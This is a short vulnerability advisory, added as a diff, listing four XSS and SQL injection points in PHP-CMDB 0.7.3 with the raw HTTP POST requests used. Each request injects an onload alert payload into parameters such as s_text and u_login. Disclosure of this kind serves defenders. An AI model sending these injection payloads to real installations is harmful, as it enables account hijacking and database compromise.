@@ -1,0 +1,77 @@
+# ==============================================================
+# Title ...| Multiple vulnerabilities in PHP-CMDB
+# Version .| php-cmdb_0.7.3
+# Date ....| 27.02.2014
+# Found ...| HauntIT Blog
+# Home ....| 
+# ==============================================================
+
+[+] From admin logged-in
+ 
+
+# ==============================================================
+# 1. XSS in SQL error
+
+---<request>---
+POST /k/cms/php-cmdb/php-cmdb_0.7.3/www/index.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 57
+
+s_text='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&s_form=1
+---<request>---
+
+
+---<response>---
+<td colspan='2' class='c_attr r_attr'>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><body/onload=alert(9999)>%' AND ci_cit_id=cit_id ORDER BY ci_title, cit_title' at line 1</td>
+</tr>
+---<response>---
+
+Same parameter seems to be vulnerable to SQL Injection attack.
+("The used SELECT statements have a different number of columns")
+
+# ==============================================================
+# 2. XSS
+
+---<request>---
+POST /k/cms/php-cmdb/php-cmdb_0.7.3/www/ci_create.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 93
+
+ci_id=0&ci_clone_id=0&ci_icon='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&ci_form=1&ci_cit_id=0
+---<request>---
+
+
+
+# ==============================================================
+# 3. XSS /SQLi 
+
+---<request>---
+POST /k/cms/php-cmdb/php-cmdb_0.7.3/www/search_advanced.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 100
+
+s_form=2&s_text='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&s_cit_id=0&s_cat_id=0&s_compare_operator=0
+---<request>---
+
+
+# ==============================================================
+# 4. XSS / SQLi
+
+---<request>---
+POST /k/cms/php-cmdb/php-cmdb_0.7.3/www/u_create_run.php HTTP/1.1
+Host: 10.149.14.62
+(...)
+Content-Length: 153
+
+u_id=0&u_form=1&u_login='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&u_active=1&u_last_name=tester&u_first_name=tester&u_role_id=1&u_email=&u_auth_backend=0
+---<request>---
+
+
+
+# ==============================================================
+# More @ http://HauntIT.blogspot.com
+# Thanks! ;)
+# o/ 
